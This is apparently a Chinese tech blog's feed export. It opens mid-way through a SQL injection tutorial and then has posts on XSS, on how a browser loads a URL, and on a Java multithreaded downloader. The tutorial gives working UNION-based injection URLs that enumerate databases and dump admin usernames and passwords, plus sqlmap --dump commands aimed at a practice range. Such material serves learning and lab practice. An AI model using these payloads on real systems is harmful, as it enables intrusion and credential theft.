class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>判断字段数</p><p>常用的两种猜解方式:</p><ul><li><p>用union联合查询：and 1=1 union select 1,2,3,4,5…… 或 union select null,null,null…..</p><p>UNION SELECT 联合查询：可以用于一个或多个SELECT的结果集，但是他有一个条件，就是两个select查询语句的查询必须要有相同的列才可以执行，利用这个特性我们可以进行对比查询，也就是说当我们union select的列与它查询的列相同时，页面返回正常。在and后面加上1=1或1=2的作用后面会讲。</p></li></ul><p>例：</p><p>当字段为2时页面返回错误</p><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">http://localhost/sqls/index.php?id=2 and 1 = 1 union select 1,2 //错误http://localhost/sqls/index.php?id=2 and 1 = 1 union select 1,2,3 //正常查询http://localhost/sqls/index.php?id=2 and 1 = 1 union select 1,2,3,4 //错误-----说明字段数就是3，输入的数大于或小于字段数时都会报错。使用 union select null,null,null 是一样的http://localhost/sqls/index.php?id=2 and 1 = 1 union select null,null,null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>2.用order by 查询“order by * — order by</p><p>order by查询：在sql语句中是对结果集的指定列进行排序，比如我们想让结果集按照第一列排序就是 order by 1 按照第二列排序 order by 2 依次类推，按照这个原理我们来判断他的字段数，如果我们按照他的第1列进行排序数据库会返回正常，但是当我们按照第100列排序，但是数据库中并不存在第100列，从而报错。  同union</p></li></ul></li></ul><p><strong>这里有两个问题</strong></p><p><strong>第一个</strong>：大部分程序只会调用数据库查询的第一条语句进行查询然后返回（我们这个也是），而通过联合查询出的数据中，我们想看到的数据是在第二条语句中，如果我们想看到我们想要的数据有两种方法，第一种是让第一条数据返回假，第二种是通过sql语句直接返回我们想要的数据。<br>第一种：我们让第一个查询的结果始终为假</p><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">http://localhost/sqls/index.php?id=2  and 1=2 union select null,null,null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>第二种</strong>：通过limit语句，limit在mysql中是用来分页的，通过他可以从查询出来的数据中获取我们想要的数据</p><p>limit语法:</p><pre><code>LIMIT [offset] rows | rows OFFSET offset</code></pre><p>LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目，初始记录行的偏移量是 0(而不是 1)。</p><p>列:</p><pre><code>SELECT * FROM table LIMIT 5,10; // 检索记录行 6-15</code></pre><p>在地址后面加入以下代码</p><pre><code>http://localhost/sqls/index.php?id=2  union select null,null,null limit 1,1</code></pre><p>  第二个：哪个列中的数据是在页面中显示出来的，有一些列中的数据只是用于后台程序处理，并不会在前台显示，所以我们需要判断哪个字段我们可以看到。所以，我们要通过数字代替NULL进行查询，来确定哪些字段会在页面中显示。这也就是为什么我们不一开始就用数字而用null，因为union select 不仅要求列的数量相同 同时数据类型也要相似。 </p><p> <img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/SQL注入漏洞/584a947239ae725aab3ee529f701eb7d.jpg" alt="img"> </p><ul><li>查询库名</li></ul><p>版本大于5.0的mysql的information_schema库中存储着mysql的所有数据库和表结构信息，所以可以利用information_schema库快速注入。</p><p>通过下面的语句可以判断数据库版本</p><pre><code>and ord(mid(version(),1,1))&gt;51</code></pre><p>解释1： 确认数据库版本， 51是ASCII码3 正确则&gt;4.0 错误则&lt;4.0，当版本大于3.0时才能使用union方法；<br>解释2：ord()是mysql的函数用于获取二进制码；<br>解释3：mid()是mysql的函数用于截位操作；<br>解释4：version()是mysql的函数用于获取当前数据库的版本；</p><pre><code>http://localhost/sqls/index.php?id=2  and ord(mid(version(),1,1))&gt;51</code></pre><p><strong>方法一:</strong></p><p>可以直接使用mysql自带函数database()查询得到数据库名：</p><pre><code>http://localhost/sqls/index.php?id=2 union select 1,database(),3 limit 1,1</code></pre><p><strong>方法二:</strong></p><p>使用以下语句语句得到所有的数据库名</p><pre><code>http://localhost/sqls/index.php?id=2 union select null,schema_name,null from information_schema.schemata</code></pre><p>还可以获取第一个库名：</p><pre><code>http://localhost/sqls/index.php?id=2 union select null,schema_name,null from information_schema.schemata limit 0,1</code></pre><p> <img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/SQL注入漏洞/86d1024ab776770ef0a2f6e559ec83df.jpg" alt="img"> </p><p>并没有显示数据库名而显示的是第一条语句查询出来的结果。在union前面加上and 1=2，就能显示出来了。</p><pre><code>http://localhost/sqls/index.php?id=2 and 1=2 union select null,schema_name,null from information_schema.schemata limit 0,1</code></pre><p>获取第二个库名：</p><pre><code>http://localhost/sqls/index.php?id=2 and 1=2 union select null,schema_name,null from information_schema.schemata limit 0,2</code></pre><ul><li>查表名</li></ul><p>在MySQL中，表名存放在information_schema数据库下tables表table_name字段中、查表名我们主要用到的是TABLES表。</p><p>方法一:</p><p>用group_concat它可以返回查询的所有结果，因为我们需要通过命名判断该我们需要的敏感数据。</p><p>group_concat()会计算哪些行属于同一组，将属于同一组的列显示出来。要返回哪些列，由函数参数(就是字段名)决定。分组必须有个标准，就是根据group by指定的列进行分组。</p><pre><code>http://localhost/sqls/index.php?id=2 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;test&#39;</code></pre><p>方法二:</p><p>使用下面的语句也是可以查出来的</p><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">http://localhost/sqls/index.php?id=2 union select null,table_name,null from information_schema.tables where table_schema='test'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>查字段</p><p>在MySQL中，字段名存放在information_schema数据库下columns表column_name字段中,这里使用的是columns表。 </p><p>方法一:</p></li></ul><pre><code>http://localhost/sqls/index.php?id=2 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;test&#39; and table_name=&#39;sqltest&#39;</code></pre><p>  <img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/SQL注入漏洞/055b34fa808266a8e9af8b9cea0865db.jpg" alt="img"> </p><p>也可以查看admin表中的字段。 </p><p>方法二:</p><pre><code>http://localhost/sqls/index.php?id=2  union select null,column_name,null from information_schema.columns where table_schema=&#39;test&#39; and table_name=&#39;admin&#39;</code></pre><ul><li><p>查数据</p><p>最终想得到的就是字段里的内容了、前面的数据库名、表名都获得了、获取值就很简单了。</p><p>方法一:</p><p>查询sqltest表:</p><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">http://localhost/sqls/index.php?id=2  union select 1,group_concat(id,title,content),3 from `sqltest`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询admin表:</p><pre><code>http://localhost/sqls/index.php?id=2 and 1=2 union select 1,group_concat(id,user,pwd),3 from admin</code></pre><p>方法二:</p><p>查询sqltest表:</p><pre><code>http://localhost/sqls/index.php?id=2 union select null,title,content from sqltest</code></pre><p>查询admin表:</p><pre><code>http://localhost/sqls/index.php?id=2 union select id,user,pwd from admin</code></pre><p>方法三:</p><p>查询admin表:</p><pre><code>http://localhost/sqls/index.php?id=2 and 1=2 union select 1,2,concat(user,0x3c,pwd) from admin</code></pre></li></ul><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><blockquote><p>工具：sqlmap</p><p>靶场：<a href="https://rimovni.exeye.run/hugkudure/well" target="_blank" rel="noopener">https://rimovni.exeye.run/hugkudure/well</a></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/SQL注入漏洞/1617673856077.png" alt="1617673856077" style="zoom:50%;"></p></blockquote><p>sqlmap注入常见用法：</p><div class="table-container"><table><thead><tr><th>检查注入点</th><th>sqlmap -u “<a href="http://ooxx.com/a.php?id=1" target="_blank" rel="noopener">http://ooxx.com/a.php?id=1</a>“</th></tr></thead><tbody><tr><td>列数据库信息</td><td>sqlmap -u “<a href="http://ooxx.com/a.php?id=1" target="_blank" rel="noopener">http://ooxx.com/a.php?id=1</a>“ —dbs</td></tr><tr><td>指定数据库名列出所有表</td><td>sqlmap -u “<a href="http://ooxx.com/a.php?id=1" target="_blank" rel="noopener">http://ooxx.com/a.php?id=1</a>“ -D dbsname —tables</td></tr><tr><td>指定数据库名表名列出所有字段</td><td>sqlmap -u “<a href="http://ooxx.com/a.php?id=1" target="_blank" rel="noopener">http://ooxx.com/a.php?id=1</a>“ -D dbsname -T tablename —columns</td></tr><tr><td>定数据库名表名字段dump出指定字段</td><td>sqlmap -u “<a href="http://ooxx.com/a.php?id=1" target="_blank" rel="noopener">http://ooxx.com/a.php?id=1</a>“ -D dbsname -T tablename -C columnname —dump</td></tr><tr><td>cookie 注入</td><td>—cookie=COOKIE 在需要登录的地方，需要登录后的cookie</td></tr><tr><td>执行指定的 SQL 语句</td><td>—sql-query=QUERY</td></tr><tr><td>代理注入</td><td>—proxy=”<a href="http://127.0.0.1:8087" target="_blank" rel="noopener">http://127.0.0.1:8087</a>“</td></tr></tbody></table></div><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><pre class="line-numbers language-lang-cmd"><code class="language-lang-cmd">python sqlmap.py -u "https://rimovni.exeye.run/hugkudure/well" --form --batch -D twosecu1_vuln_06 -T flag -C flag --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>—form   :表单</p><p>—batch  :跳过选择</p></blockquote><p>开始注入，获得数据库</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/SQL注入漏洞/1617674097343.png" alt="1617674097343"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=&quot;SQL注入&quot;&gt;&lt;/a&gt;SQL注入&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.bugbank.cn/q/article/598
      
    
    </summary>
    
    
    
      <category term="security" scheme="https://kayleh.top/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>Front end security</title>
    <link href="https://kayleh.top/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    <id>https://kayleh.top/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/</id>
    <published>2021-04-04T07:56:49.000Z</published>
    <updated>2021-04-11T17:11:28.754Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前端安全</p></blockquote><h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>跨站脚本攻击，是WEB程序中一种常见的漏洞。其主要的攻击手段是在在利用网站上的可由用户输入信息的地方，恶意注入含有攻击性的脚本，达到攻击网站或者窃取用户cookied等隐私信息的目的。</p><blockquote><p>XSS漏洞测设流程：<br>第一步：在目标站点上找到输入点，比如查询接口，留言板等；<br>第二步：输入一组“特殊字符+唯一识别字符”，点击提交，查看返回的源码，是否有做对应的处理；<br>第三步：通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构成执行js的条件（构造闭合）<br>第四步：提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，如果成功执则说明存在XSS漏洞</p></blockquote><h1 id="Html5存储"><a href="#Html5存储" class="headerlink" title="Html5存储"></a>Html5存储</h1><p><img src="https://static.cdnjs.cloud/20200628/%E6%89%B9%E6%B3%A8%202020-06-28%20113456_2412.png" alt="img"> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;前端安全&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;xss&quot;&gt;&lt;a href=&quot;#xss&quot; class=&quot;headerlink&quot; title=&quot;xss&quot;&gt;&lt;/a&gt;xss&lt;/h1&gt;&lt;p&gt;跨站脚本攻击，是WEB程序中一种常见的漏洞。其主要的攻
      
    
    </summary>
    
    
    
      <category term="security" scheme="https://kayleh.top/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>What happened from entering the URL to displaying the page?</title>
    <link href="https://kayleh.top/%E4%BB%8E%E8%BE%93%E5%85%A5URL%E5%88%B0%E6%98%BE%E7%A4%BA%E9%A1%B5%E9%9D%A2%E7%BB%8F%E5%8E%86%E4%BA%86%E4%BB%80%E4%B9%88/"/>
    <id>https://kayleh.top/%E4%BB%8E%E8%BE%93%E5%85%A5URL%E5%88%B0%E6%98%BE%E7%A4%BA%E9%A1%B5%E9%9D%A2%E7%BB%8F%E5%8E%86%E4%BA%86%E4%BB%80%E4%B9%88/</id>
    <published>2021-03-30T09:22:51.000Z</published>
    <updated>2021-04-15T15:10:07.693Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从输入URL到显示页面经历了什么"><a href="#从输入URL到显示页面经历了什么" class="headerlink" title="从输入URL到显示页面经历了什么?"></a>从输入URL到显示页面经历了什么?</h1><blockquote><ul><li><p>这个过程可以大致分为两个部分：网络通信和页面渲染。</p><h3 id="一、网络通信"><a href="#一、网络通信" class="headerlink" title="一、网络通信"></a>一、网络通信</h3><p>  互联网内各网络设备间的通信都遵循TCP/IP协议，利用TCP/IP协议族进行网络通信时，会通过分层顺序与对方进行通信。分层由高到低分别为：应用层、传输层、网络层、数据链路层。发送端从应用层往下走，接收端从数据链路层网上走。如图所示：</p><p><a href="http://images0.cnblogs.com/blog/622045/201507/020946547655321.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/从输入URL到显示页面经历了什么/020946553127518.png" alt="TCPIP"></a></p><h4 id="1-在浏览器中输入url"><a href="#1-在浏览器中输入url" class="headerlink" title="1. 在浏览器中输入url"></a>1. 在浏览器中输入url</h4><p>  用户输入url，例如<a href="http://[www.baidu.com](http://www.baidu.com/)。其中http为协议，[www.baidu.com](http://www.baidu.com/)为网络地址，及指出需要的资源在那台计算机上。一般网络地址可以为域名或IP地址，此处为域名。使用域名是为了方便记忆，但是为了让计算机理解这个地址还需要把它解析为IP地址。">http://[www.baidu.com](http://www.baidu.com/)。其中http为协议，[www.baidu.com](http://www.baidu.com/)为网络地址，及指出需要的资源在那台计算机上。一般网络地址可以为域名或IP地址，此处为域名。使用域名是为了方便记忆，但是为了让计算机理解这个地址还需要把它解析为IP地址。</a></p><h4 id="2-应用层DNS解析域名"><a href="#2-应用层DNS解析域名" class="headerlink" title="2.应用层DNS解析域名"></a>2.应用层DNS解析域名</h4><p>  客户端先检查本地是否有对应的IP地址，若找到则返回响应的IP地址。若没找到则请求上级DNS服务器，直至找到或到根节点。</p></li></ul><ul><li>DNS中递归查询和迭代查询的区别</li></ul><p>  1、 递归查询： 一般客户机和服务器之间属递归查询，即当客户机向DNS服务器发出请求后，若DNS服务器本身不能解析，则会向另外的DNS服务器发出查询请求，得到结果后转交客户机。</p><p>  2、 迭代查询（反复查询）： 一般DNS服务器之间属迭代查询，如：若DNS2不能响应DNS1的请求，则它会将DNS3的IP给DNS2，以便其再向DNS3发出请求。</p><p>  以一个DNS请求解析为例：</p><p>  1）用户发起域名请求到dnsA，这时dnsA有这个记录，将结果返回给用户，这个过程是递归查询。</p><p>  2）用户发起域名请求到dnsA，这时dns没有这个记录，它去向dnsB问有没有这个记录，以此类推，直到把结果返回给用户，这个过程是递归查询。</p><p>  3）用户发起域名请求到dnsA，这时dnsA没有这个记录，它告诉用户，我没有这个记录，你去问dnsB吧，这个过程是迭代查询。</p><h4 id="3-应用层客户端发送HTTP请求"><a href="#3-应用层客户端发送HTTP请求" class="headerlink" title="3.应用层客户端发送HTTP请求"></a>3.应用层客户端发送HTTP请求</h4><p>  HTTP请求包括请求报头和请求主体两个部分，其中请求报头包含了至关重要的信息，包括请求的方法（GET / POST）、目标url、遵循的协议（http / https / ftp…），返回的信息是否需要缓存，以及客户端是否发送cookie等。</p><h4 id="4-传输层TCP传输报文"><a href="#4-传输层TCP传输报文" class="headerlink" title="4.传输层TCP传输报文"></a>4.传输层TCP传输报文</h4><pre><code>位于传输层的TCP协议为传输报文提供可靠的字节流服务。它为了方便传输，将大块的数据分割成以报文段为单位的数据包进行管理，并为它们编号，方便服务器接收时能准确地还原报文信息。TCP协议通过“三次握手”等方法保证传输的安全可靠。</code></pre><p>   “三次握手”的过程是，发送端先发送一个带有SYN（synchronize）标志的数据包给接收端，在一定的延迟时间内等待接收的回复。接收端收到数据包后，传回一个带有SYN/ACK标志的数据包以示传达确认信息。接收方收到后再发送一个带有ACK标志的数据包给接收端以示握手成功。在这个过程中，如果发送端在规定延迟时间内没有收到回复则默认接收方没有收到请求，而再次发送，直到收到回复为止。</p><p>  <a href="http://images0.cnblogs.com/blog/622045/201507/020946557039933.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/从输入URL到显示页面经历了什么/020946560314133.png" alt="TCP"></a> </p><h4 id="5-网络层IP协议查询MAC地址"><a href="#5-网络层IP协议查询MAC地址" class="headerlink" title="5.网络层IP协议查询MAC地址"></a>5.网络层IP协议查询MAC地址</h4><pre><code>IP协议的作用是把TCP分割好的各种数据包传送给接收方。而要保证确实能传到接收方还需要接收方的MAC地址，也就是物理地址。IP地址和MAC地址是一一对应的关系，一个网络设备的IP地址可以更换，但是MAC地址一般是固定不变的。ARP协议可以将IP地址解析成对应的MAC地址。当通信的双方不在同一个局域网时，需要多次中转才能到达最终的目标，在中转的过程中需要通过下一个中转站的MAC地址来搜索下一个中转目标。</code></pre><h4 id="6-数据到达数据链路层"><a href="#6-数据到达数据链路层" class="headerlink" title="6.数据到达数据链路层"></a>6.数据到达数据链路层</h4><pre><code>在找到对方的MAC地址后，就将数据发送到数据链路层传输。这时，客户端发送请求的阶段结束</code></pre><h4 id="7-服务器接收数据"><a href="#7-服务器接收数据" class="headerlink" title="7.服务器接收数据"></a>7.服务器接收数据</h4><pre><code>接收端的服务器在链路层接收到数据包，再层层向上直到应用层。这过程中包括在运输层通过TCP协议讲分段的数据包重新组成原来的HTTP请求报文。</code></pre><h4 id="8-服务器响应请求"><a href="#8-服务器响应请求" class="headerlink" title="8.服务器响应请求"></a>8.服务器响应请求</h4><pre><code>服务接收到客户端发送的HTTP请求后，查找客户端请求的资源，并返回响应报文，响应报文中包括一个重要的信息——状态码。状态码由三位数字组成，其中比较常见的是200 OK表示请求成功。301表示永久重定向，即请求的资源已经永久转移到新的位置。在返回301状态码的同时，响应报文也会附带重定向的url，客户端接收到后将http请求的url做相应的改变再重新发送。404 not found 表示客户端请求的资源找不到。</code></pre><h4 id="9-服务器返回相应文件"><a href="#9-服务器返回相应文件" class="headerlink" title="9. 服务器返回相应文件"></a>9. 服务器返回相应文件</h4><pre><code>请求成功后，服务器会返回相应的HTML文件。接下来就到了页面的渲染阶段了。</code></pre><h3 id="二、页面渲染"><a href="#二、页面渲染" class="headerlink" title="二、页面渲染"></a>二、页面渲染</h3><pre><code>现代浏览器渲染页面的过程是这样的：解析HTML以构建DOM树 –&gt; 构建渲染树 –&gt; 布局渲染树 –&gt; 绘制渲染树。DOM树是由HTML文件中的标签排列组成，渲染树是在DOM树中加入CSS或HTML中的style样式而形成。渲染树只包含需要显示在页面中的DOM元素，像&lt;head&gt;元素或display属性值为none的元素都不在渲染树中。在浏览器还没接收到完整的HTML文件时，它就开始渲染页面了，在遇到外部链入的脚本标签或样式标签或图片时，会再次发送HTTP请求重复上述的步骤。在收到CSS文件后会对已经渲染的页面重新渲染，加入它们应有的样式，图片文件加载完立刻显示在相应位置。在这一过程中可能会触发页面的重绘或重排。</code></pre></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;从输入URL到显示页面经历了什么&quot;&gt;&lt;a href=&quot;#从输入URL到显示页面经历了什么&quot; class=&quot;headerlink&quot; title=&quot;从输入URL到显示页面经历了什么?&quot;&gt;&lt;/a&gt;从输入URL到显示页面经历了什么?&lt;/h1&gt;&lt;blockquote&gt;
&lt;u
      
    
    </summary>
    
    
    
      <category term="network" scheme="https://kayleh.top/tags/network/"/>
    
  </entry>
  
  <entry>
    <title>Download</title>
    <link href="https://kayleh.top/DOWNLOAD/"/>
    <id>https://kayleh.top/DOWNLOAD/</id>
    <published>2021-03-15T09:18:07.000Z</published>
    <updated>2021-04-15T15:26:11.540Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-多线程下载器的设计与实现"><a href="#Java-多线程下载器的设计与实现" class="headerlink" title="Java 多线程下载器的设计与实现"></a>Java 多线程下载器的设计与实现</h1><p>应用并发的场景有很多，下载文件就是一个很常见的并发场景。</p><p>为什么会想写多线程下载器呢？不知道你用过 IDM（Internet Download Manager）没，我刚使用 IDM 时，就被它的下载方式吸引了。</p><p>用 IDM 下载文件时，能够直观地看到它的下载过程：固定用 N 个线程下载文件，一开始先将文件分为 N 段，每段用一个线程下载，当某一段下载完成之后，对应的线程就空闲了，此时怎么做呢？从剩余的 N - 1 段中取出最大的一段，一分为二，这样就又有了 N 段的数据，让空闲的线程去下载新划分出来的这一段。</p><p>每当有一个线程完成下载任务时，就不断从剩余的部分中划分出一段给它下载，直到整个文件的所有部分都下载完毕。</p><p>当然，文件并不能被无限地分段，IDM 会设定一个段的阈值，当剩余的最大段小于这个阈值的时候，就不再分段了给空闲的线程了，只等待活动中的所有线程下载完毕。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/DOWNLOAD/idm.png" alt="img"></p><p>说完 IDM 的下载策略，我们大致有了思路。不过优秀的软件不是一蹴而就的，虽然我们想写出像 IDM 的下载器，但还需要从简单的实现开始，不断迭代优化。</p><p>所以我们一开始采用的策略是：固定 N 个线程，并将文件划分为 N 段，每个线程负责下载一段数据。</p><h3 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h3><p><strong>判断服务器是否支持断点续传</strong></p><p>首先要明确的是，多线程下载文件利用的是每个线程下载文件的一部分，那么就需要 HTTP 服务器支持请求部分数据，或者说断点续传，因此第一步需要判断目标文件是否支持断点续传。</p><p>HTTP 请求头中有一个 <code>Range</code> 字段，可以用来指定要请求的数据范围，例如我们要请求从第 10 字节到第 20 字节的数据，可以将该字段写为 <code>Range:bytes=10-20</code>。</p><p>相应的，如果 HTTP 服务器支持断点续传，那么对于指定了 <code>Range</code> 字段的请求，会返回 206 状态码。</p><p>我们用 Curl 来测试一下：</p><pre class="line-numbers language-lang-bash"><code class="language-lang-bash">curl -I --header "Range: bytes=0-" http://mirrors.163.com/debian/ls-lR.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到的响应：</p><pre class="line-numbers language-lang-null"><code class="language-lang-null">HTTP/1.1 206 Partial ContentServer: nginxDate: Wed, 25 Apr 2018 02:57:56 GMTContent-Type: application/octet-streamContent-Length: 15316619Connection: keep-aliveLast-Modified: Mon, 23 Apr 2018 14:38:44 GMTETag: "5addeff4-e9b68b"Content-Range: bytes 0-15316618/15316619<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们设置 <code>Range: bytes=0-</code> ，表示请求从第 0 字节到最后一字节的数据，那为什么还要指定该字段呢？这是出于两方面的原因：一是判断响应的状态码是否为 206，二是得到文件的大小。</p><p>如果服务器支持断点续传，那么我们采用多线程进行下载，如果不支持断点续传，就采用单线程下载。</p><p><strong>文件分段</strong></p><p>我们得到了文件的大小 fileSize，将其分为 N 段，则每一段的大小为 <code>fileSize / N</code>，由于文件通常不会正好被分为 N 段，因此最后一段就等于剩余的部分的大小。</p><p>我们用一个数组 endPoint 来存放每一段的起止位置，例如一个 10 B 的文件，起止范围是 0~9，如果分为 3 段下载，那么 <code>endPoint = {0, 3, 6, 10}</code>，对每段来说是左闭右开区间。</p><p>解释：对于第 i 段（i 从 0 开始）来说，从 <code>endPoint[i]</code> 开始下载，在 <code>endPoint[i + 1] - 1</code> 处停止。同理，对第 i + 1 段来说，从 <code>endPoint[i + 1]</code> 开始，在 <code>endPoint[i + 2] - 1</code> 处停止。</p><p><strong>创建下载线程</strong></p><p>我们为每一段创建一个下载线程进行下载，每一段都存放在一个单独的临时文件中。</p><p>下载线程需要做的事情可以总结如下：</p><ul><li>设置请求头的 <code>Range</code> 字段来指定请求范围</li><li>设置超时时间</li><li>连接 HTTP 服务器</li><li>创建临时文件（第一次下载该段）</li><li>读取服务器返回的数据，写入到临时文件，直到读取的字节数等于该段的大小</li><li>关闭临时文件</li></ul><p>上面是顺利下载的流程，我们还需要在出现下列问题时进行重试：</p><ul><li>如果连接时间或读取时间超时</li><li>临时文件读写出错</li></ul><p>这样又有问题了，对于该线程来说，重试时是重新下载整段，还是接着下载剩余部分？我们知道，最好就是接着下载还没下完的那部分，那如何实现呢？</p><p>我们可以这么做：每个线程保存自己负责部分的起止位置，在刚启动线程时，起止位置就是段的起止位置，创建临时文件写出已下载的数据。在下载数据时，实时更新线程的起始位置为当前已下载字节的下一个字节，当出错需要重试时，直接从该位置开始，并且写出到之前创建的临时文件中。</p><p><strong>创建监视线程</strong></p><p>我们创建一个守护线程，负责监视文件的下载进度、下载速度、当前活跃线程数，在各线程下载结束后，通知主线程做下一步处理。</p><p><strong>处理临时文件</strong></p><p>当主线程收到通知，所有部分都下载完成时，就需要对临时文件进行清理。</p><p>如果是多线程下载的文件，那么需要对多个临时文件进行合并。</p><p>如果是单线程下载的文件，则对临时文件进行重命名。</p><h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><p>这里给出程序的轮廓，进行整体上的介绍，完整的源码可查看 Github：<a href="https://github.com/wrayzheng/java-multithread-downloader" target="_blank" rel="noopener">https://github.com/wrayzheng/java-multithread-downloader</a></p><pre class="line-numbers language-lang-java"><code class="language-lang-java">public class HttpDownloader {    private boolean resumable;    private URL url;    private File localFile;    private int[] endPoint;    private Object waiting = new Object();    private AtomicInteger downloadedBytes = new AtomicInteger(0);    private AtomicInteger aliveThreads = new AtomicInteger(0);    private boolean multithreaded = true;    private int fileSize = 0;    private int THREAD_NUM = 5;    private int TIME_OUT = 5000;    private final int MIN_SIZE = 2 << 20;    public HttpDownloader(String Url, String localPath) throws MalformedURLException {...}    public HttpDownloader(String Url, String localPath,            int threadNum, int timeout) throws MalformedURLException {...}    //开始下载文件    public void get() throws IOException {...}    //检测目标文件是否支持断点续传，以决定是否开启多线程下载文件的不同部分    public boolean supportResumeDownload() throws IOException {...}    //监测下载速度及下载状态，下载完成时通知主线程    public void startDownloadMonitor() {...}    //对临时文件进行合并或重命名    public void cleanTempFile() throws IOException {...}    //合并多线程下载产生的多个临时文件    public void merge() {...}    //一个下载线程负责下载文件的某一部分，如果失败则自动重试，直到下载完成    class DownloadThread extends Thread {        private int id;        private int start;        private int end;        private OutputStream out;        public DownloadThread(int id, int start, int end) {...}        //保证文件的该部分数据下载完成        @Override        public void run() {...}        //下载文件指定范围的部分        public boolean download() {...}    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里将 DownloadThread 定义为 HttpDownloader 的内部类，这是因为一个 HttpDownloader 实例对应一个文件下载任务，该实例中存放了该任务的各种数据，而下载线程是与该任务是关联的，需要用到这些数据，因此定义为内部类可以直接共享这些数据，从而避免过多的参数传递和存储。</p><p>要下载一个文件，首先创建一个 HttpDownloader 实例，必须传入的参数是目标文件 URL 和本地的存储位置，可选参数是线程数和超时时间。</p><p>HttpDownloader 的入口方法为 get()，它的工作如下：</p><ul><li>调用 supportResumeDownload() 方法判断目标文件是否支持断点续传以及是否大于设定的文件最小值，以决定是否采取多线程的下载方式；</li><li>计算每一段的起止位置，存入 endPoint；</li><li>创建 DownloadThread 线程进行下载；</li><li>调用 startDownloadMonitor() 方法启动监视线程；</li><li>等待文件下载完毕；</li><li>调用 cleanTempFile() 处理临时文件；</li><li>输出结束信息。</li></ul><p>再来介绍一下 DownloadThread，它的入口方法是 run()，工作如下：</p><ul><li>调用 download() 方法下载指定部分的数据;</li><li>如果成功，则线程结束，如果失败，则回到上一步。</li></ul><h3 id="下载测试"><a href="#下载测试" class="headerlink" title="下载测试"></a>下载测试</h3><p>对于单个连接限速的服务器，多线程下载才能体现其优势，如果服务器本身不对连接限速，那么单个连接也能接近带宽上限。</p><p>我们来看看，对于单个连接速度远小于带宽时，单线程与多线程的对比。</p><p>首先是单个线程进行下载：</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/DOWNLOAD/downloader-one-threads.gif" alt="img"></p><p>用时 54.133 秒，平均下载速度 42 KB/s。</p><p>开启 10 个线程进行下载：</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/DOWNLOAD/downloader-ten-threads.gif" alt="img"></p><p>用时 10.144 秒，平均下载速度 228 KB/s。</p><p>可以看到，相比单线程下载，开启多线程之后下载速度有了巨大的提升。</p><p>在实际下载时，根据网络状况不同，设置不同的超时时间，对下载速度也有不小的影响。如果超时时间设置过小，会导致线程频繁建立连接，而建立连接是相对耗时的操作，导致下载效率低下；如果超时时间设置过长，可能连接已经失效，而客户端却长时间等待，无谓地消耗时间。</p><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>这是一个最基本的多线程下载器的实现，将文件划分为固定的 N 段，分配给 N 个线程下载，当一个线程下载完成后，该线程就随之结束了，没有被再次利用。</p><p>之后我会对该程序做进一步的优化，一方面会采取和 IDM 